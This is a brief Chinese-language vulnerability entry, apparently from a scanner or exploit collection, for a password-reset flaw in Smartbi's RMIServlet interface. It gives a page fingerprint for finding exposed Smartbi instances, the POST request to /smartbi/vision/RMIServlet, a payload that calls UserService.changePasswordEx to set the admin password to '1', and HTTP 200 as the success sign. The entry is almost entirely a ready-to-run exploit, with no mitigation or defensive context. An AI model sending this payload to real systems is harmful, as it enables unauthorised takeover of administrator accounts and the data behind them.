# Smartbi接口RMIServlet用户密码重置漏洞

Smartbi ｜ 其他 ｜ —
- **指纹**：`body="gcfutil = jsloader.resolve('smartbi.gcf.gcfutil')"`
- **请求**：`POST /smartbi/vision/RMIServlet HTTP/1.1`

**Payload**
```
className=UserService&methodName=changePasswordEx&params=["admin","","1"]
```
- **响应特征**：200